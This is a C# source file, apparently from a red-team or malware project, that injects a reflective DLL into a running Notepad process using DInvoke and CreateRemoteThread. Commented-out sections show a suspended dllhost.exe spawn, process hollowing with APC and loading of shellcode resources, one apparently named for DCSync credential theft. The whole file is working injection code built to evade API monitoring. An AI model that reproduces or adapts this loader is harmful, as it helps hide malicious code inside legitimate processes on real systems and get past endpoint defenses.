using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Data.Kernel32;
using WinAPI.Wrapper;

namespace Inject
{
    internal class Program
    {
        public static string GetRunningExeName()
        {
            string processName = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = System.IO.Path.GetFileName(processName);
            return exeName;
        }

        static void Main(string[] args)
        {
            APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;
            //APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.PInvoke;
            APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.CreateRemoteThread;
            //APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.ProcessHollowingWithAPC;

            string cmd = @"c:\windows\system32\dllhost.exe";
            //byte[] shellcode = Properties.Resources.Payload;
            //byte[] shellcode = Properties.Resources.dcsyn;
            byte[] reflectiveDll = File.ReadAllBytes("E:\\Share\\Projects\\C++\\CustomLoader\\x64\\Release\\RflDllAssemblyLoader.dll");
            ProcessCreationResult procResult = null;

            try
            {

                Console.WriteLine($"[?] WinAPIAccess = {APIWrapper.Config.PreferedAccessType}");

                /************* new processs***************/

                //var creationParms = new ProcessCreationParameters()
                //{
                //    Command = cmd,
                //    //
                //    //
                //    //RedirectOutput = true,
                //    RedirectOutput = false,
                //    CreateNoWindow = true,
                //    CreateSuspended = true,
                //};


                //procResult = APIWrapper.CreateProcess(creationParms);
                //Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
                //Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
                //Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");

                ////APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
                //var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
                //APIWrapper.Inject(procResult.Handle, procResult.tr, reflectiveDll, offset);

                //if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
                //{
                //    var process = Process.GetProcessById(procResult.ProcessId);
                //    Console.WriteLine("[+] Result :");
                //    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => Console.Write(output));
                //}



                /************* existing processs***************/
                var process = Process.GetProcessesByName("Notepad").FirstOrDefault();
                if (process == null)
                {
                    return;
                }

                IntPtr hProcess = APIWrapper.OpenProcess(process.Id, ProcessAccessFlags.PROCESS_VM_WRITE |
    ProcessAccessFlags.PROCESS_VM_OPERATION |
    ProcessAccessFlags.PROCESS_CREATE_THREAD);
                // OUVRIR UN NOUVEAU HANDLE AVEC LES BONS DROITS
                //IntPtr hProcess = WinAPI.DInvoke.Kernel32.NtOpenProcess(
                //    (uint)processId,
                //    ProcessAccessFlags.PROCESS_ALL_ACCESS
                //);

                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine($"Failed to open process with sufficient rights. Error: {Marshal.GetLastWin32Error()}");
                    return;
                }

                var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
                APIWrapper.Inject(hProcess, IntPtr.Zero, reflectiveDll, offset);

            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Oooops something went wrong....");
                Console.WriteLine(ex.ToString());
            }
            finally
            {
                if (procResult != null)
                {
                    APIWrapper.CloseHandle(procResult.ProcessHandle);
                    APIWrapper.CloseHandle(procResult.ThreadHandle);
                    APIWrapper.CloseHandle(procResult.OutPipeHandle);
                    //APIWrapper.KillProcess(procResult.ProcessId);
                }
            }
        }
    }
}
